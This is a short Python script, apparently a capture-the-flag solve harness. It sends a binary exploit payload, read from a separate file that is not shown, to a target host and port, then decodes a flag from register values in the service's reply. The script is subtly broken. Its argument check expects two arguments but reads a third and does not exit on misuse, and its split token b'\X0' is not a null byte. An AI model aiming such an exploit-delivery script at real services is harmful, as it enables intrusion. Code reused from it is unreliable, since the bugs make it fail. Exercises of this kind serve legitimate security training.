#!/usr/bin/python3

import socket
import sys
import struct


if len(sys.argv) != 2:
    print("Usage: python3 ./exploit.py <IP> <PORT>")

with open("exploit", "rb") as fp:
    cc = fp.read()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], int(sys.argv[2])))
s.sendall(cc)

buf = b""
while True:
    t = s.recv(1024)
    if len(t) == 0:
        break
    buf += t

print(buf)
assert buf.endswith(b"Goodbye.\n")
assert b"Registers" in buf
for l in buf.split(b"\n"):
    if b"Registers" in l:
        break
registers = [int(v) for v in l.split(b"[")[1].split(b"]")[0].split(b",")]
tstr = b""
for v in registers:
    tstr += struct.pack("<I", v)
flag = tstr.split(b"\X0")[0].decode("utf-8")
print("FLAG:", flag)
assert "{" in flag
assert "}" in flag
assert registers[9] == 0



